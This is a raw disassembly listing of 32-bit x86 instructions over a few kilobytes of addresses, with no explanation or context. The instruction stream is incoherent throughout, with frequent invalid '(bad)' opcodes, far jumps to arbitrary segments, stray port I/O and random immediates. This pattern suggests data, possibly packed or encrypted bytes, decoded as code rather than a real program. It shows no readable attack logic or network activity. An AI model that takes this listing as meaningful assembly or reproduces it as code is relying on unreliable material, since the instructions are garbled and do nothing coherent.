  422523:	pop    ss
  422524:	add    esi,ecx
  422526:	les    ecx,FWORD PTR [eax-0x58eff7cd]
  42252c:	jp     0x422561
  42252e:	xor    al,0xe6
  422530:	fwait
  422531:	push   esp
  422532:	daa    
  422533:	dec    eax
  422534:	push   es
  422535:	out    0x32,al
  422537:	jae    0x42254b
  422539:	pop    ecx
  42253a:	sbb    al,bl
  42253c:	in     eax,0xca
  42253e:	inc    cx
  422540:	mov    esi,0xc3b73635
  422545:	in     eax,0xdd
  422547:	cld    
  422548:	jle    0x42253d
  42254a:	push   edi
  42254b:	push   esp
  42254c:	das    
  42254d:	xor    al,0x68
  42254f:	aaa    
  422550:	and    eax,0x2124ca17
  422555:	fstp   st(4)
  422557:	scas   eax,DWORD PTR es:[edi]
  422558:	popf   
  422559:	xor    ebx,0x23b85575
  42255f:	inc    ah
  422561:	inc    ebp
  422562:	inc    esp
  422563:	push   edi
  422564:	sub    esi,esp
  422566:	jmp    0xbcad:0xfe3e7fb3
  42256d:	pop    ebx
  42256e:	or     DWORD PTR [esi+0x5f],esi
  422571:	adc    al,0xd7
  422573:	pushf  
  422574:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422575:	xor    dh,bl
  422577:	xchg   dl,cl
  422579:	ret    0x7a66
  42257c:	adc    edx,eax
  42257e:	outs   dx,BYTE PTR ds:[esi]
  42257f:	fimul  WORD PTR [ecx+0x74]
  422582:	xor    cl,BYTE PTR [ecx]
  422584:	jp     0x4225cc
  422586:	mov    dl,0x47
  422588:	fnstenv [eax+0x24f3a5f3]
  42258e:	sbb    ah,0x25
  422591:	lea    ebx,ds:0x5ce27c49
  422597:	jae    0x4225cf
  422599:	fild   WORD PTR [ebp+0x6c]
  42259c:	popf   
  42259d:	dec    esi
  42259e:	adc    ah,ch
  4225a0:	cdq    
  4225a1:	jp     0x42256b
  4225a3:	pop    eax
  4225a4:	data16 inc BYTE PTR [edx]
  4225a7:	out    0x7d,al
  4225a9:	cld    
  4225aa:	cmc    
  4225ab:	or     al,0xfe
  4225ad:	push   ds
  4225ae:	sahf   
  4225af:	(bad)  
  4225b0:	imul   edx,DWORD PTR [esi-0xd],0xeae01584
  4225b7:	inc    edx
  4225b8:	cdq    
  4225b9:	and    al,0x87
  4225bb:	cli    
  4225bc:	push   ebp
  4225bd:	in     al,0x71
  4225bf:	adc    edx,DWORD PTR [edx+edi*4+0x3674a21f]
  4225c6:	sbb    al,0xe4
  4225c8:	neg    BYTE PTR [edi]
  4225ca:	dec    eax
  4225cb:	pop    ebp
  4225cc:	outs   dx,DWORD PTR ds:[esi]
  4225cd:	sti    
  4225ce:	popf   
  4225cf:	adc    eax,DWORD PTR [edx+0x72]
  4225d2:	lock out dx,al
  4225d4:	stc    
  4225d5:	cmp    bh,BYTE PTR [edx-0x7c]
  4225d8:	fadd   DWORD PTR [ebx]
  4225da:	dec    edi
  4225db:	mov    edx,0x74574d09
  4225e0:	(bad)  
  4225e2:	mov    al,0x4a
  4225e4:	mov    ebx,?
  4225e6:	in     al,dx
  4225e7:	add    bh,BYTE PTR [edx]
  4225e9:	xchg   ebp,eax
  4225ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4225eb:	out    dx,al
  4225ec:	inc    ebp
  4225ed:	test   DWORD PTR [esi],esp
  4225ef:	cmc    
  4225f0:	(bad)  
  4225f1:	xchg   ecx,eax
  4225f2:	dec    esi
  4225f3:	lock sub DWORD PTR [esi+0x2089425f],esi
  4225fa:	aas    
  4225fb:	jae    0x422580
  4225fd:	push   0xffffffc1
  4225ff:	jbe    0x422650
  422601:	popa   
  422602:	xchg   ebx,eax
  422603:	mov    bh,0xab
  422605:	cmp    al,0x2d
  422607:	and    DWORD PTR [ebx],esi
  422609:	add    ah,BYTE PTR [eax-0x713f73c0]
  42260f:	or     DWORD PTR ds:0xbe85760,ebx
  422615:	xchg   ebp,eax
  422616:	mov    ah,0xae
  422618:	xor    esp,esp
  42261a:	xchg   ecx,eax
  42261b:	ins    DWORD PTR es:[edi],dx
  42261c:	pop    ecx
  42261d:	mov    DWORD PTR [edx-0x22751f38],esp
  422623:	mov    al,0xd1
  422625:	and    DWORD PTR [ecx],edi
  422627:	mov    ds:0xc83b2faa,al
  42262c:	dec    ebp
  42262d:	xchg   edx,eax
  42262e:	inc    ebp
  42262f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422630:	sub    al,0x1a
  422632:	ret    0x54c5
  422635:	pop    esp
  422636:	sbb    eax,0x8de46aa9
  42263b:	(bad)  
  42263c:	(bad)  
  42263d:	int    0xf7
  42263f:	jp     0x42264f
  422641:	adc    DWORD PTR [ecx+eiz*4+0x27d31b20],ecx
  422648:	ror    ebp,0xbf
  42264b:	imul   ebp,DWORD PTR [eax+0x52d783e7],0xaeb6b942
  422655:	rcl    DWORD PTR [edx+esi*1],0x1f
  422659:	dec    ebx
  42265a:	and    BYTE PTR [esp+esi*4],0xb9
  42265e:	inc    eax
  42265f:	retf   0x8f14
  422662:	ror    DWORD PTR [eax+eiz*4-0x70],0xc6
  422667:	mov    al,0x73
  422669:	ret    0xa0ae
  42266c:	jge    0x42267e
  42266e:	add    DWORD PTR [edi+0x70b01614],esp
  422674:	out    dx,eax
  422675:	jmp    0x4226f6
  422677:	jmp    0x42266d
  422679:	and    eax,0xaee59df7
  42267e:	mov    ebp,DWORD PTR [eax-0xc]
  422681:	xchg   DWORD PTR [eax],esp
  422683:	out    dx,eax
  422684:	or     edi,ecx
  422686:	xchg   edi,eax
  422687:	xor    dl,cl
  422689:	(bad)  
  42268a:	sbb    al,BYTE PTR [edx+0x64]
  42268d:	retf   
  42268e:	test   al,0xf
  422690:	fstp   DWORD PTR [ebx-0x7c]
  422693:	mov    DWORD PTR [eax],esi
  422695:	and    al,0xf6
  422697:	or     eax,0xb62aeddc
  42269c:	jmp    FWORD PTR [edx+0x1135bcc2]
  4226a2:	call   0x4a87ebb5
  4226a7:	out    dx,al
  4226a8:	lahf   
  4226a9:	loop   0x422715
  4226ab:	push   edx
  4226ac:	inc    eax
  4226ad:	adc    dl,BYTE PTR [ecx+eiz*4-0xc]
  4226b1:	cmp    eax,DWORD PTR [ebx]
  4226b3:	daa    
  4226b4:	mov    edx,eax
  4226b6:	je     0x422673
  4226b8:	shl    BYTE PTR [esi+0x3a],1
  4226bb:	pop    edx
  4226bc:	xor    eax,0x25f65399
  4226c1:	sbb    eax,0x74efa79f
  4226c6:	inc    edi
  4226c7:	call   0xac01:0x6793a109
  4226ce:	inc    ebx
  4226cf:	scas   al,BYTE PTR es:[edi]
  4226d0:	push   esi
  4226d1:	sub    eax,0x9ca6ca19
  4226d6:	xchg   edi,eax
  4226d7:	xchg   ebx,eax
  4226d8:	bound  esi,QWORD PTR [eax]
  4226da:	push   esi
  4226db:	call   0x375f5ad3
  4226e0:	ret    0xeeec
  4226e3:	add    ch,BYTE PTR [esi]
  4226e5:	mov    ecx,ss
  4226e7:	push   esi
  4226e8:	fnsave [edi]
  4226ea:	ins    DWORD PTR es:[edi],dx
  4226eb:	jne    0x4226b2
  4226ed:	mov    ah,ah
  4226ef:	or     al,0x3
  4226f1:	js     0x422703
  4226f3:	in     al,dx
  4226f4:	ror    ah,1
  4226f6:	out    dx,eax
  4226f7:	out    dx,al
  4226f8:	cmp    al,0xca
  4226fa:	pop    edi
  4226fb:	not    DWORD PTR [eax-0x6c]
  4226fe:	test   DWORD PTR [edi-0x3f],edx
  422701:	(bad)  
  422702:	fnsave [eax+0x59]
  422705:	outs   dx,DWORD PTR ds:[esi]
  422706:	aas    
  422707:	shl    esi,1
  422709:	nop
  42270a:	test   bl,bl
  42270c:	popa   
  42270d:	mov    bh,0xc3
  42270f:	pop    edx
  422710:	nop
  422711:	and    DWORD PTR [eax-0x7f],0x8755b042
  422718:	xor    BYTE PTR [esi],dh
  42271a:	inc    ebx
  42271b:	jns    0x42274f
  42271d:	mov    dh,0xd8
  42271f:	aaa    
  422720:	lods   eax,DWORD PTR ds:[esi]
  422721:	int3   
  422722:	call   0xbc1:0xf424ac61
  422729:	retf   0x2718
  42272c:	imul   esi,DWORD PTR [eax-0x6ff735fb],0x86d0c8a
  422736:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422737:	fldcw  WORD PTR [eax]
  422739:	push   es
  42273a:	mov    bl,0xb6
  42273c:	sbb    DWORD PTR [ecx],ebp
  42273e:	jmp    0x5321:0xa7d46ae
  422745:	fcmovnu st,st(7)
  422747:	xchg   esp,eax
  422748:	xor    eax,0x3d6d7719
  42274d:	mov    dh,BYTE PTR [ebp-0x7c]
  422750:	inc    esi
  422751:	ins    DWORD PTR es:[edi],dx
  422752:	cld    
  422753:	fst    DWORD PTR [eax+0x79a3f06a]
  422759:	cmp    edi,DWORD PTR [edi]
  42275b:	pushf  
  42275c:	mov    ch,0x9a
  42275e:	out    dx,al
  42275f:	gs push es
  422761:	add    eax,0xed93614e
  422766:	mov    cl,0x8f
  422768:	lahf   
  422769:	lea    eax,[edi+0x77]
  42276c:	mov    bh,0x45
  42276e:	add    DWORD PTR [esi-0x16eaf171],edi
  422774:	push   esi
  422775:	mov    ebx,0x6b392c3
  42277a:	adc    bh,BYTE PTR [ecx+0x61]
  42277d:	mov    edi,DWORD PTR [ebx+0x106b9511]
  422783:	(bad)  
  422785:	pop    esp
  422786:	iret   
  422787:	(bad)  
  422788:	sbb    ebx,esi
  42278a:	inc    ebx
  42278b:	pushf  
  42278c:	jnp    0x422770
  42278e:	mov    bl,0x69
  422790:	out    0x6b,eax
  422792:	push   eax
  422793:	sbb    al,0x3d
  422795:	fidivr DWORD PTR [eax-0x3c67b156]
  42279b:	jmp    0x2ad61ad
  4227a0:	and    al,0x9f
  4227a2:	xchg   edx,eax
  4227a3:	inc    ebp
  4227a4:	lds    edx,FWORD PTR [ecx+0x26]
  4227a7:	out    dx,al
  4227a8:	addr16 inc ebp
  4227aa:	and    BYTE PTR [esi+0x390007bb],bh
  4227b0:	not    BYTE PTR [edi-0x7]
  4227b3:	add    DWORD PTR [ebp+0x7527a1b0],ebp
  4227b9:	mov    ah,0x7d
  4227bb:	jle    0x4227c1
  4227bd:	pop    ebx
  4227be:	or     eax,0x58ef6bdb
  4227c3:	(bad)  
  4227c5:	sbb    esi,DWORD PTR [esi]
  4227c7:	test   al,0xdf
  4227c9:	mov    esp,cs
  4227cb:	mov    edi,0x824f0da0
  4227d0:	cs ja  0x4227b8
  4227d3:	adc    al,0x9b
  4227d5:	in     al,dx
  4227d6:	mov    cl,0x25
  4227d8:	lea    ebp,[edx+edx*4-0x17da05a7]
  4227df:	add    BYTE PTR [edi+0x75],ch
  4227e2:	pop    es
  4227e3:	add    eax,0x487fa1b2
  4227e8:	cmp    BYTE PTR [esi+0x5b],ch
  4227eb:	adc    edx,ecx
  4227ed:	mov    dl,0x94
  4227ef:	jb     0x4227d5
  4227f1:	lock mov ds:0x11956fed,al
  4227f7:	ds jecxz 0x42278b
  4227fa:	push   esi
  4227fb:	sub    BYTE PTR [ecx+0x73891c2f],ah
  422801:	mov    dh,0xc3
  422803:	sar    DWORD PTR [eax-0x30],cl
  422806:	sub    al,0xfb
  422808:	mov    dh,bh
  42280a:	test   bl,cl
  42280c:	inc    eax
  42280d:	repz and al,0xf9
  422810:	xchg   edi,eax
  422811:	fild   QWORD PTR [ebx-0x80]
  422814:	lods   eax,DWORD PTR ds:[esi]
  422815:	lock jnp 0x4227f6
  422818:	lds    ecx,FWORD PTR [ecx+0x7d]
  42281b:	pushf  
  42281c:	pusha  
  42281d:	mov    al,0x45
  42281f:	mov    ecx,0xedd7209c
  422824:	mov    ch,0x5b
  422826:	pop    ebx
  422827:	dec    ebx
  422828:	int3   
  422829:	jp     0x42289f
  42282b:	shl    BYTE PTR [esi],0x9a
  42282e:	dec    edx
  42282f:	ret    0x79d2
  422832:	push   edi
  422833:	test   edi,ebx
  422835:	cmp    bh,BYTE PTR [edx]
  422837:	add    BYTE PTR [esp+ebx*8+0xc13994b],ch
  42283e:	adc    eax,DWORD PTR ss:[ebp-0x80]
  422842:	mov    al,0x37
  422844:	cmc    
  422845:	inc    ebx
  422846:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422847:	or     al,BYTE PTR [edx-0x6d]
  42284a:	arpl   WORD PTR [edx+ebp*2+0x44a641],ax
  422851:	ds test edi,edi
  422854:	in     al,dx
  422855:	ins    DWORD PTR es:[edi],dx
  422856:	mov    edi,0x2fd804a3
  42285b:	jo     0x4227fa
  42285d:	aas    
  42285e:	jmp    0x7411:0xcea6902c
  422865:	pop    esp
  422866:	icebp  
  422867:	inc    BYTE PTR [ebx+0x299db8bd]
  42286d:	jg     0x4228cd
  42286f:	xor    BYTE PTR [ecx-0x4f],cl
  422872:	inc    ebx
  422873:	(bad)  
  422874:	jne    0x4228b4
  422876:	jecxz  0x42282c
  422878:	mov    ecx,0x6e03ec7b
  42287d:	dec    ebx
  42287e:	test   esi,0x27f7ba27
  422884:	ins    BYTE PTR es:[edi],dx
  422885:	mov    cl,0x8
  422887:	ins    BYTE PTR es:[edi],dx
  422888:	sub    BYTE PTR [edi],0x98
  42288b:	pop    ebp
  42288c:	push   ss
  42288d:	hlt    
  42288e:	and    DWORD PTR ds:0xf0a21a00,esp
  422894:	outs   dx,BYTE PTR ds:[esi]
  422895:	ins    DWORD PTR es:[edi],dx
  422896:	mov    ebx,0x3e025d73
  42289b:	pop    es
  42289c:	add    al,0xd1
  42289e:	mov    eax,0x3a699bac
  4228a3:	test   eax,0x9613fe11
  4228a8:	cdq    
  4228a9:	sahf   
  4228aa:	mov    al,ds:0x9e3bc51c
  4228af:	loope  0x4228dc
  4228b1:	gs or  al,0xc6
  4228b4:	xor    ecx,DWORD PTR [edx-0x45]
  4228b7:	inc    esi
  4228b8:	outs   dx,DWORD PTR ds:[si]
  4228ba:	xlat   BYTE PTR ds:[ebx]
  4228bb:	popa   
  4228bc:	dec    esp
  4228bd:	bound  edi,QWORD PTR [ebp-0x48364329]
  4228c3:	mov    ah,0xd6
  4228c5:	addr16 or eax,0x5f433450
  4228cb:	das    
  4228cc:	push   ebx
  4228cd:	bound  ecx,QWORD PTR [edi-0x78]
  4228d0:	retf   0x6bc6
  4228d3:	gs xchg esi,eax
  4228d5:	sub    ebx,ebp
  4228d7:	or     bl,BYTE PTR [esi+edi*1+0xd09183c]
  4228de:	sub    bl,BYTE PTR [edi+0x6d]
  4228e1:	xor    BYTE PTR ds:0x54e9c97e,dl
  4228e7:	dec    ebx
  4228e8:	cwde   
  4228e9:	cmp    DWORD PTR [ebx],edx
  4228eb:	mov    edx,0xbd6fd7f7
  4228f0:	sbb    dl,ah
  4228f2:	loop   0x42291d
  4228f4:	(bad)  
  4228f5:	scas   al,BYTE PTR es:[edi]
  4228f6:	mov    ch,0xa
  4228f8:	aam    0xf8
  4228fa:	push   0x2e
  4228fc:	jbe    0x4228b6
  4228fe:	mul    cl
  422900:	mov    ecx,0xfa6c83f7
  422905:	jge    0x4228f3
  422907:	aam    0xed
  422909:	setae  BYTE PTR [esi+0x151bf102]
  422910:	popf   
  422911:	pcmpeqw mm1,mm5
  422914:	rcr    DWORD PTR [edx],0xec
  422917:	sti    
  422918:	mov    dh,0x23
  42291a:	outs   dx,DWORD PTR ds:[esi]
  42291b:	xchg   edi,eax
  42291c:	adc    DWORD PTR [esi-0x2ad958ee],ecx
  422922:	mov    WORD PTR [ebp+0x4ac445b2],es
  422928:	push   cs
  422929:	rol    DWORD PTR [eax-0x1c],cl
  42292c:	cs aaa 
  42292e:	je     0x4228f8
  422930:	jmp    0x6874:0x2bef286e
  422937:	es lock aas 
  42293a:	jmp    0x422930
  42293c:	jmp    0x422948
  42293e:	(bad)  
  42293f:	bound  ebp,QWORD PTR [esi+0x6835159b]
  422945:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422946:	adc    eax,0xdd74d52e
  42294b:	dec    eax
  42294c:	rol    DWORD PTR [edi-0x1f93c11a],1
  422952:	mov    edi,0x457f39e9
  422957:	pushf  
  422958:	lea    ebx,[edi-0x7d737e4e]
  42295e:	jo     0x422904
  422960:	cmp    eax,0x91961e8e
  422965:	pop    edi
  422966:	in     al,0xbd
  422968:	pusha  
  422969:	loope  0x42290c
  42296b:	adc    DWORD PTR [eax-0x4012ebc3],ecx
  422971:	pushf  
  422972:	jne    0x4229d7
  422974:	and    bh,dh
  422976:	cs mov cl,0xae
  422979:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42297a:	xchg   edx,eax
  42297b:	add    DWORD PTR [ecx+ebx*4+0x6ec0e281],ebx
  422982:	dec    BYTE PTR [ebx]
  422984:	rcr    DWORD PTR [edx-0xa76e95],1
  42298a:	les    ecx,FWORD PTR [esi]
  42298c:	fnstenv [eax+0x3cc7bc28]
  422992:	ins    DWORD PTR es:[edi],dx
  422993:	or     al,bh
  422995:	inc    esi
  422996:	sub    al,0xdf
  422998:	mov    ecx,0x801bef91
  42299d:	pop    eax
  42299e:	pop    ss
  42299f:	mov    bh,0x53
  4229a1:	jmp    0x1445:0x32fee936
  4229a8:	fs cmp eax,0x92011122
  4229ae:	test   ah,ah
  4229b0:	push   ebp
  4229b1:	fld    st(0)
  4229b3:	lahf   
  4229b4:	(bad)  
  4229b5:	xchg   edi,eax
  4229b6:	add    al,0xa6
  4229b8:	icebp  
  4229b9:	sub    al,0x54
  4229bb:	lds    ebp,FWORD PTR [esp+ebx*4+0x3362f8fe]
  4229c2:	pop    edx
  4229c3:	pop    edx
  4229c4:	sbb    DWORD PTR [esp+ebx*4+0x55],ebx
  4229c8:	imul   eax,DWORD PTR [ebx-0x27f901c5],0x31
  4229cf:	mov    dl,0xb4
  4229d1:	xchg   ebx,eax
  4229d2:	cmp    DWORD PTR [edx],esp
  4229d4:	ret    
  4229d5:	xlat   BYTE PTR ds:[ebx]
  4229d6:	fild   DWORD PTR [edx-0x5c]
  4229d9:	icebp  
  4229da:	sbb    eax,DWORD PTR [eax+0x50db228]
  4229e0:	ficom  WORD PTR [eax+0x6a]
  4229e3:	adc    eax,0xa4103825
  4229e8:	xor    DWORD PTR [edx],ecx
  4229ea:	in     eax,dx
  4229eb:	pop    edx
  4229ec:	test   eax,0x3b0d128a
  4229f1:	scas   eax,DWORD PTR es:[edi]
  4229f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4229f3:	sbb    ecx,DWORD PTR [eax]
  4229f5:	out    dx,eax
  4229f6:	push   ss
  4229f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4229f8:	in     eax,0xab
  4229fa:	pop    esi
  4229fb:	outs   dx,BYTE PTR ds:[esi]
  4229fc:	jl     0x422a0f
  4229fe:	neg    DWORD PTR [ecx-0x6c]
  422a01:	in     eax,0x81
  422a03:	sti    
  422a04:	dec    ecx
  422a05:	shl    DWORD PTR [esi+0x2007455d],cl
  422a0b:	das    
  422a0c:	lds    edx,FWORD PTR [edx+0x1f1d4293]
  422a12:	loopne 0x4229b0
  422a14:	add    DWORD PTR [edx+0x4c],esi
  422a17:	push   es
  422a18:	dec    esi
  422a19:	sti    
  422a1a:	sbb    esi,DWORD PTR [ebp-0x5b]
  422a1d:	jnp    0x422a4b
  422a1f:	xor    al,0x79
  422a21:	cmc    
  422a22:	xor    ebp,DWORD PTR ds:0x514284
  422a28:	sbb    eax,esi
  422a2a:	mov    edi,0xd1aed644
  422a2f:	push   ecx
  422a30:	aad    0x34
  422a32:	fisttp DWORD PTR [ebx]
  422a34:	add    al,0x14
  422a36:	xor    BYTE PTR [ebx+ebp*1+0x5f2073e0],0xae
  422a3e:	mov    edx,0x16aa85b3
  422a43:	jmp    0x7f842615
  422a48:	test   BYTE PTR [eax+0x38],ah
  422a4b:	clc    
  422a4c:	ror    BYTE PTR [edi],cl
  422a4e:	outs   dx,BYTE PTR ds:[esi]
  422a4f:	pop    ss
  422a50:	cmp    BYTE PTR [edx+0x38],cl
  422a53:	dec    esp
  422a54:	dec    ebp
  422a55:	and    al,dl
  422a57:	inc    ebp
  422a58:	mov    dl,BYTE PTR [ebx]
  422a5a:	jnp    0x4229ea
  422a5c:	lods   al,BYTE PTR ds:[esi]
  422a5d:	inc    ebx
  422a5e:	fisub  WORD PTR [edi-0x58]
  422a61:	jmp    0x32921fd9
  422a66:	imul   ecx,DWORD PTR [eax+0x63c48bac],0xffffffae
  422a6d:	sub    dl,0x2e
  422a70:	and    eax,edx
  422a72:	dec    edx
  422a73:	sbb    al,0xae
  422a75:	repnz aad 0x9
  422a78:	add    dh,ch
  422a7a:	add    edx,edi
  422a7c:	push   0x64
  422a7e:	sbb    esp,edi
  422a80:	hlt    
  422a81:	mov    ebx,0x39643cc9
  422a86:	sbb    eax,0xc7d4f0dc
  422a8b:	adc    dl,ch
  422a8d:	push   ss
  422a8e:	inc    edi
  422a8f:	mov    ecx,0xb074760d
  422a94:	ins    DWORD PTR es:[edi],dx
  422a95:	mov    eax,ds:0x2c2ed17a
  422a9a:	jnp    0x422a49
  422a9c:	jns    0x422b18
  422a9e:	retf   
  422a9f:	dec    ebp
  422aa0:	outs   dx,DWORD PTR ds:[esi]
  422aa1:	fldenv [ecx-0x5bf844c]
  422aa7:	push   ebx
  422aa8:	aaa    
  422aa9:	sub    DWORD PTR [edi+0x68],esi
  422aac:	jge    0x422a53
  422aae:	dec    ebp
  422aaf:	mov    dl,0x35
  422ab1:	ins    DWORD PTR es:[edi],dx
  422ab2:	adc    BYTE PTR [edi],0x35
  422ab5:	fxch   st(0)
  422ab7:	fild   QWORD PTR [esi]
  422ab9:	sub    edx,esi
  422abb:	daa    
  422abc:	ret    
  422abd:	fiadd  DWORD PTR [edi+0x3813edfb]
  422ac3:	inc    edx
  422ac4:	dec    esp
  422ac5:	fmul   DWORD PTR [bp+di-0x3017]
  422aca:	add    ax,0xd453
  422ace:	outs   dx,DWORD PTR ds:[esi]
  422acf:	ss gs ret 
  422ad2:	mov    bh,0x9f
  422ad4:	(bad)  
  422ad5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422ad6:	retf   
  422ad7:	sub    eax,0xb11a9dfe
  422adc:	xor    esi,0x70f82dc6
  422ae2:	fs test eax,0xd31a27f0
  422ae8:	pop    ebp
  422ae9:	sub    BYTE PTR [esi+0x6c],bl
  422aec:	aas    
  422aed:	adc    edx,ecx
  422aef:	icebp  
  422af0:	push   0xccb0680
  422af5:	xchg   BYTE PTR [edx+eiz*1+0x5aa1e163],bh
  422afc:	cmp    DWORD PTR [esp+eiz*8+0x40],esp
  422b00:	inc    esp
  422b01:	sbb    BYTE PTR [edi-0x3d],0x20
  422b05:	retf   
  422b06:	test   eax,0x42a67e1
  422b0b:	xchg   DWORD PTR [eax],ecx
  422b0d:	mov    esi,0xa39efe86
  422b12:	mov    al,ds:0x7192d69e
  422b17:	addr16 add eax,0x76cbdb71
  422b1d:	es pushf 
  422b1f:	into   
  422b20:	pop    ss
  422b21:	icebp  
  422b22:	jbe    0x422b2a
  422b24:	loope  0x422b9a
  422b26:	or     ebp,DWORD PTR [edx]
  422b28:	stc    
  422b29:	(bad)  
  422b2a:	in     al,0xcd
  422b2c:	cwde   
  422b2d:	mov    ah,0x73
  422b2f:	(bad)  
  422b30:	mov    esp,0x1965daa3
  422b35:	pop    esp
  422b36:	stos   BYTE PTR es:[edi],al
  422b37:	jnp    0x422b28
  422b39:	cli    
  422b3a:	cmc    
  422b3b:	hlt    
  422b3c:	outs   dx,BYTE PTR ds:[esi]
  422b3d:	mov    ds:0x4fcdee27,eax
  422b42:	xor    dh,cl
  422b44:	sahf   
  422b45:	dec    eax
  422b46:	add    eax,0x96764347
  422b4b:	call   0x4010d349
  422b50:	jmp    0x422af6
  422b52:	sbb    ch,BYTE PTR [ecx+ebx*8-0x6cfa7917]
  422b59:	xchg   edi,eax
  422b5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422b5b:	inc    eax
  422b5c:	cmp    eax,0x376b50d2
  422b61:	mov    ebp,0xbb0d8047
  422b66:	in     eax,dx
  422b67:	call   0x3a94:0x4b45ae21
  422b6e:	sub    DWORD PTR [edi-0x13cd9cb3],esi
  422b74:	outs   dx,DWORD PTR ds:[esi]
  422b75:	stc    
  422b76:	ja     0x422bdf
  422b78:	fimul  DWORD PTR [eax+0x59]
  422b7b:	mov    esi,0x9eab0bd2
  422b80:	lods   eax,DWORD PTR ds:[esi]
  422b81:	cwde   
  422b82:	hlt    
  422b83:	sahf   
  422b84:	mov    cl,0xa6
  422b86:	loop   0x422b28
  422b88:	sbb    DWORD PTR [ebx],ecx
  422b8a:	xchg   ecx,eax
  422b8b:	ins    DWORD PTR es:[edi],dx
  422b8c:	push   ecx
  422b8d:	sahf   
  422b8e:	lea    ecx,ds:[esi+ebx*2+0x8]
  422b93:	and    al,0x2f
  422b95:	push   esp
  422b96:	cmp    BYTE PTR [eax],bh
  422b98:	sbb    ch,BYTE PTR [ebx-0x5cef32bf]
  422b9e:	sub    BYTE PTR [ecx-0x3f777c7c],cl
  422ba4:	(bad)  
  422ba5:	mov    ebx,DWORD PTR [ebp-0x61f33888]
  422bab:	dec    ebp
  422bac:	js     0x422b72
  422bae:	xor    DWORD PTR [edi+0x9cdc09f],esp
  422bb4:	ss dec ebp
  422bb6:	pop    DWORD PTR [ebx]
  422bb8:	cli    
  422bb9:	xor    DWORD PTR [edi-0x758c40d5],ecx
  422bbf:	jo     0x422bdd
  422bc1:	xor    ebx,DWORD PTR [esi]
  422bc3:	add    al,0x73
  422bc5:	cwde   
  422bc6:	inc    esp
  422bc7:	fisubr DWORD PTR [ebx+0x2b589064]
  422bcd:	mov    ch,0xfe
  422bcf:	in     al,dx
  422bd0:	xchg   BYTE PTR [esi],cl
  422bd2:	mov    dh,0xbb
  422bd4:	shl    BYTE PTR [ecx+0x0],cl
  422bd7:	(bad)  
  422bd8:	out    dx,al
  422bd9:	mov    DWORD PTR ds:0xd29975fc,0x7cca5e08
  422be3:	cs lock adc dh,bh
  422be7:	jbe    0x422b6c
  422be9:	ficomp DWORD PTR [edx+esi*1+0xb3113b6]
  422bf0:	pop    esi
  422bf1:	push   0x78d9431a
  422bf6:	jne    0x422c3d
  422bf8:	jmp    0x422c34
  422bfa:	adc    eax,0xca08e00e
  422bff:	iret   
  422c00:	xor    BYTE PTR [ecx-0x1b9c677e],al
  422c06:	aaa    
  422c07:	int3   
  422c08:	mov    ecx,edx
  422c0a:	neg    BYTE PTR [ebp+0x4d]
  422c0d:	mov    ecx,0x3ecc845b
  422c12:	jmp    0x960a0bb1
  422c17:	pusha  
  422c18:	pop    eax
  422c19:	mov    ah,0xd
  422c1b:	aad    0x4b
  422c1d:	jnp    0x422c02
  422c1f:	mov    edi,0xdc527f2c
  422c24:	push   ebp
  422c25:	pushf  
  422c26:	mov    ?,WORD PTR [edx+0x255a205b]
  422c2c:	shl    BYTE PTR [edx-0x55782239],0xfa
  422c33:	js     0x422bfe
  422c35:	jmp    DWORD PTR [edi+ebp*1-0xc]
  422c39:	adc    al,0xa6
  422c3b:	mov    al,ds:0x9b6417ff
  422c40:	cmp    al,0x69
  422c42:	inc    ebx
  422c43:	sahf   
  422c44:	ins    DWORD PTR es:[edi],dx
  422c45:	sub    al,0xa8
  422c47:	lock je 0x422cad
  422c4a:	add    edi,DWORD PTR [edi]
  422c4c:	daa    
  422c4d:	imul   ebp,DWORD PTR [ebx+0x7c],0x9f34d8ea
  422c54:	test   BYTE PTR [ebx+0x65],bh
  422c57:	xchg   ebx,eax
  422c58:	(bad)  
  422c59:	sbb    bh,bl
  422c5b:	adc    edx,DWORD PTR [edi-0x2]
  422c5e:	push   esi
  422c5f:	jne    0x422be7
  422c61:	int3   
  422c62:	enter  0x2f86,0x6a
  422c66:	or     esi,DWORD PTR [esi]
  422c68:	aas    
  422c69:	cdq    
  422c6a:	xchg   esp,eax
  422c6b:	add    bl,0x7a
  422c6e:	in     al,dx
  422c6f:	aaa    
  422c70:	test   BYTE PTR [edi-0x4286a134],dh
  422c76:	xor    BYTE PTR [ebx-0x32294818],0x6
  422c7d:	scas   eax,DWORD PTR es:[edi]
  422c7e:	mov    ecx,0xb271b26
  422c83:	and    ebx,edi
  422c85:	aam    0xc1
  422c87:	mov    esi,0xe38a6cdf
  422c8c:	(bad)  [edi-0x15]
  422c8f:	in     eax,0xc5
  422c91:	sbb    BYTE PTR [ebp+edx*8-0x7af25a18],ah
  422c98:	xchg   edx,eax
  422c99:	jno    0x422cf6
  422c9b:	xchg   edx,eax
  422c9c:	add    ebp,DWORD PTR [edi+0x66cbcd15]
  422ca2:	mov    edx,0xa61aadb6
  422ca7:	stos   BYTE PTR es:[edi],al
  422ca8:	mov    dl,0xc5
  422caa:	lods   al,BYTE PTR ds:[esi]
  422cab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422cac:	scas   al,BYTE PTR es:[edi]
  422cad:	(bad)  
  422cae:	pop    esp
  422caf:	dec    ecx
  422cb0:	icebp  
  422cb1:	jg     0x422c3f
  422cb3:	xchg   BYTE PTR ds:0x50686629,cl
  422cb9:	jl     0x422cdb
  422cbb:	mov    ebx,0xdce4f0bd
  422cc0:	fmul   QWORD PTR [esi+0x7e]
  422cc3:	cs adc al,bh
  422cc6:	xchg   edi,eax
  422cc7:	dec    edx
  422cc8:	call   0x4f15:0x59e2b549
  422ccf:	(bad)  
  422cd0:	nop
  422cd1:	retf   
  422cd2:	icebp  
  422cd3:	std    
  422cd4:	and    eax,0xba7421eb
  422cd9:	inc    edx
  422cda:	mov    eax,0x5a6bf864
  422cdf:	pop    es
  422ce0:	pop    ds
  422ce1:	inc    edx
